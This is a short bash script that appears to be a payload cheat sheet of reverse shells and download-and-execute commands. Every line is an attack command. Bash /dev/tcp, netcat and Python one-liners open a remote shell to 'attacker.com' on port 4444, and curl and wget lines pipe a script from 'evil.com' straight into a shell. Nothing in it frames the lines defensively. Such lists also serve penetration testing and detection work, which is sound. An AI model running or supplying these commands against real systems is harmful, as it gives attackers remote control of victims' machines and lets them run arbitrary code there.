#!/bin/bash
# Reverse shell - connects back to attacker

# Bash reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Netcat reverse shell
nc -e /bin/sh attacker.com 4444

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Download and execute
curl https://evil.com/payload.sh | bash
wget -O- https://evil.com/payload.sh | sh
